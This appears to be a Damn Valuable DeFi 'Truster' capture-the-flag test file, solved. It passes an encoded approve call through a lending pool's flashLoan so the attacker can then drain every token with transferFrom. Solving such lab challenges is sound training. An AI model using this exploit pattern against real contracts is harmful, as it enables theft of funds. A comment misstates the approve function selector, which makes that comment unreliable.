const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */

        // i think we want to call the deployed DVT contract here, and call approve(attacker, TOKENS_IN_POOL)
        // calldata: 
        //  Keccak-256(approve) = 5219209e
        //  attacker: pad address to 32 bytes
        //  TOKENS_IN_POOL: pad to 32 bytes
        //
        [deployer, attacker] = await ethers.getSigners();

        let ABI = [
            "function approve(address spender, uint256 amount)"
        ];
        let iface = new ethers.utils.Interface(ABI);
        const calldata = iface.encodeFunctionData("approve", [ attacker.address, TOKENS_IN_POOL ]);
        console.log(calldata);
        await this.pool.connect(attacker).flashLoan(0, attacker.address, this.token.address, calldata);
        console.log("made calldata call")
        // now attacker should be approved to spend all of the tokens in the pool
        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
        console.log("transferred tokens");
        console.log(await this.token.balanceOf(attacker.address));
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

